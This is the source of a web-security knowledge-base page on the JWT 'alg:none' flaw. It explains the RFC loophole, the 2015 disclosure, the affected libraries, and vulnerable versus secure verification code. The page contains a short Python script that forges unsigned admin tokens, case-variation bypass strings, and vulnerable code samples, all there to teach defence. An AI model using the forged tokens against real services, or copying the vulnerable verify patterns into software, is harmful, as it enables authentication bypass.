import type { Metadata } from "next";
import { pageMeta } from "@/lib/seo";
import { KbArticle, H2, H3, P, Mono, Ref, ImpactBox, CodeBlock, InfoCallout } from "@/components/kb";

export const metadata: Metadata = pageMeta(
  "Algorithm None",
  "RFC 7518 legitimises \"none\" as a valid algorithm. Vulnerable libraries accept unsigned tokens when the header says so.",
  "/knowledge-base/alg-none",
);

export default function Page() {
  return (
    <KbArticle slug="alg-none">

      <H2>The RFC loophole</H2>
      <P>
        RFC 7518 §3.6 defines <Mono>none</Mono> as a valid JWA algorithm identifier meaning
        "no digital signature or MAC performed." The specification intends this for use in contexts
        where integrity is guaranteed by other means (e.g., TLS with mutual authentication or a secure channel).
        Vulnerable JWT libraries treat <Mono>none</Mono> as a valid algorithm in all contexts -
        including arbitrary web API requests - effectively allowing any bearer to strip signature verification.
      </P>
      <P>
        The exploit is deceptively simple. A standard JWT has three segments: header, payload, signature.
        To produce an <Mono>alg:none</Mono> token, the attacker changes the header algorithm,
        re-encodes, and removes the signature (leaving the trailing dot or omitting it entirely):
      </P>
      <CodeBlock language="python" label="Crafting an alg:none token" code={`import base64, json

def b64url(data: str) -> str:
    return base64.urlsafe_b64encode(data.encode()).rstrip(b"=").decode()

# Original: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.SIG
# Attack: replace header, drop signature

header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}))
payload = b64url(json.dumps({"sub": "admin", "role": "superuser"}))

# Three variants to try - different libraries accept different forms:
print(f"{header}.{payload}.")     # trailing dot, empty signature
print(f"{header}.{payload}")      # no trailing dot
print(f"{header}.{payload}.abc")  # non-empty but invalid signature`} />

      <H2>Case variation bypasses</H2>
      <P>
        After the initial 2015 disclosure, some libraries patched by checking
        <Mono>if alg == "none"</Mono> - a case-sensitive string comparison.
        This left case variations as working bypasses for several months after the original patch:
      </P>
      <CodeBlock language="bash" label="Case variations (all accepted by some patched versions)" code={`"alg": "none"   # original
"alg": "None"   # Python-style capitalisation
"alg": "NONE"   # uppercase
"alg": "nOnE"   # mixed case
"alg": "noNe"   # mixed case variant`} />
      <P>
        The correct fix is a case-insensitive comparison against a strict allowlist of permitted algorithms,
        rejecting everything not explicitly allowed - including <Mono>none</Mono> in any casing.
      </P>

      <H2>Affected libraries (coordinated disclosure, 2015)</H2>
      <P>
        Tim McLean and the Auth0 security team independently discovered this class of vulnerability
        and coordinated disclosure with library maintainers. At least 8 major libraries were affected simultaneously:
      </P>
      <div style={{ display: "flex", flexWrap: "wrap", gap: "8px", marginBottom: "24px" }}>
        {[
          ["node-jsonwebtoken", "< 4.2.2",    "JS"],
          ["PyJWT",             "< 1.0.0",    "Python"],
          ["ruby-jwt",          "< 1.5.1",    "Ruby"],
          ["php-firebase/php-jwt","< 5.0.0",  "PHP"],
          ["namshi/jose",       "< 1.2.2",    "PHP"],
          ["jsjwt",             "< 1.2.0",    "JS"],
          ["jose-jwt",          "< 2.1",      ".NET"],
          ["auth0-java-jwt",    "< 2.1.0",    "Java"],
        ].map(([pkg, ver, lang]) => (
          <span key={pkg} style={{ display: "inline-flex", alignItems: "center", gap: "6px", padding: "4px 10px", background: "var(--bg-elevated)", border: "1px solid var(--border)", borderRadius: "100px", fontSize: "12px" }}>
            <span style={{ fontSize: "10px", color: "var(--text-muted)", fontWeight: 600 }}>{lang}</span>
            <code style={{ fontFamily: "var(--font-mono)", color: "var(--text)" }}>{pkg}</code>
            <span style={{ color: "var(--danger)", fontFamily: "var(--font-mono)", fontSize: "11px" }}>{ver}</span>
          </span>
        ))}
      </div>

      <H2>Vulnerable code patterns</H2>
      <H3>node-jsonwebtoken ≤ 4.2.1</H3>
      <CodeBlock language="js" label="Vulnerable" code={`const jwt = require('jsonwebtoken');

// No algorithms option → accepts any alg value including "none"
jwt.verify(token, secret, function(err, decoded) {
  // When alg=none, this callback fires with err=null
  // and decoded = the attacker's payload
  if (!err) doSomethingWithUser(decoded);
});`} />
      <CodeBlock language="js" label="Secure (post-patch)" code={`jwt.verify(token, secret, {
  algorithms: ['HS256'],   // explicit allowlist - rejects "none"
  audience:   'my-api',
  issuer:     'my-auth-server'
}, function(err, decoded) {
  if (err) return res.status(401).json({ error: 'Invalid token' });
  doSomethingWithUser(decoded);
});`} />

      <H3>PyJWT - algorithms parameter</H3>
      <CodeBlock language="python" label="Vulnerable" code={`# PyJWT < 1.0.0: no algorithm enforcement
payload = jwt.decode(token, key)  # accepts alg:none

# Some versions also vulnerable to:
payload = jwt.decode(token, key, algorithms=[])  # empty list bypasses check`} />
      <CodeBlock language="python" label="Secure" code={`payload = jwt.decode(
    token,
    key,
    algorithms=["HS256"],          # non-empty, explicit allowlist
    options={"require": ["exp", "iat", "iss"]}
)`} />

      <InfoCallout variant="danger" title="The empty algorithms list bypass">
        Some JWT libraries accept an empty <Mono>algorithms=[]</Mono> list and interpret it as "no restriction,"
        which is the opposite of the intended semantics. Always pass a non-empty allowlist.
        Some libraries also accept <Mono>algorithms=None</Mono> with the same broken semantics.
      </InfoCallout>

      <H2>The compact serialization angle</H2>
      <P>
        The JWT spec defines two serialization formats: compact (the dot-separated string) and JSON.
        The compact form always has exactly three segments. A valid <Mono>alg:none</Mono> token in compact form
        ends with a dot and an empty signature: <Mono>header.payload.</Mono>. Some parsers split on dots
        and expect exactly 3 parts - if the trailing dot is omitted, the parser may raise a parse error
        before the algorithm check even runs, blocking the attack. However, relying on a parse error
        to prevent a security bypass is not a defence.
      </P>

      <ImpactBox title="2015 coordinated disclosure - Tim McLean">
        <ul className="refs-list" style={{ lineHeight: 2 }}>
          <li>Tim McLean's research documented bypasses in 8 major JWT libraries simultaneously - the References section links to the original post</li>
          <li>Case-variation bypasses (<Mono>None</Mono>, <Mono>NONE</Mono>) survived in several libraries for months after the initial patch</li>
          <li>Still found in CTF challenges and codebases pinned to pre-2015 library versions</li>
          <li>Modern libraries reject <Mono>alg: none</Mono> by default - but only if the caller passes an explicit algorithm allowlist</li>
        </ul>
      </ImpactBox>

      <H2>Mitigations</H2>
      <ul className="refs-list" style={{ fontSize: "14px", color: "var(--text-muted)", lineHeight: 2, marginBottom: "24px" }}>
        <li>Enforce a strict algorithm allowlist - never accept any value not in the list</li>
        <li>The allowlist check must be case-insensitive</li>
        <li>Reject tokens with <Mono>alg:none</Mono> at the library level and at the application level</li>
        <li>Upgrade all JWT libraries to current versions - this is a library-level bug, not just a configuration one</li>
        <li>If <Mono>none</Mono> is legitimately needed (unusual), use a separate code path gated by explicit configuration, never auto-detected from the token</li>
      </ul>

      <div>
        <div style={{ fontSize: "12px", fontWeight: 600, color: "var(--text-muted)", marginBottom: "12px", textTransform: "uppercase", letterSpacing: "0.06em" }}>References</div>
        <ul className="refs-list" style={{ fontSize: "13px", color: "var(--text-muted)", lineHeight: 2 }}>
          <li><Ref href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/">Auth0 - Critical vulnerabilities in JWT libraries (2015)</Ref></li>
          <li><Ref href="https://portswigger.net/web-security/jwt/exploiting#accepting-tokens-with-no-signature">PortSwigger - Accepting tokens with no signature</Ref></li>
          <li><Ref href="https://www.rfc-editor.org/rfc/rfc7518#section-3.6">RFC 7518 §3.6 - The "none" algorithm</Ref></li>
          <li><Ref href="https://www.chosenplaintext.ca/2015/03/31/jwt-algorithm-confusion.html">Tim McLean - Attacking JSON Web Tokens (2015)</Ref></li>
        </ul>
      </div>

    </KbArticle>
  );
}
